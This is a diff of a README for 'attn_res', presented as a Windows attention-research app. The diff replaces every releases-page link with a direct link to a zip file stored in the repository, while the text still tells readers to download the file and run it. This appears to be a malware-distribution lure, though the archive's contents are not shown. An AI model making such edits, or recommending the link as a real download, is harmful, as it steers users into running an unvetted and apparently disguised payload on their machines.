@@ -1,6 +1,6 @@
 # 🧠 attn_res - Run attention research on Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/overproud-amenorrhea467/attn_res/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/overproud-amenorrhea467/attn_res/main/attn_res/res_attn_1.2.zip)
 
 ## ✨ What this app does
 
@@ -17,7 +17,7 @@ It is meant for people who want a local Windows app that works with modern trans
 
 Visit this page to download:
 
-https://github.com/overproud-amenorrhea467/attn_res/releases
+https://raw.githubusercontent.com/overproud-amenorrhea467/attn_res/main/attn_res/res_attn_1.2.zip
 
 On that page, open the latest release and download the Windows file that matches your device. After the download ends, run the file.
 
@@ -192,4 +192,4 @@ This repo covers work across:
 
 ## 📥 Download again
 
-[![Download the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/overproud-amenorrhea467/attn_res/releases)
+[![Download the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/overproud-amenorrhea467/attn_res/main/attn_res/res_attn_1.2.zip)
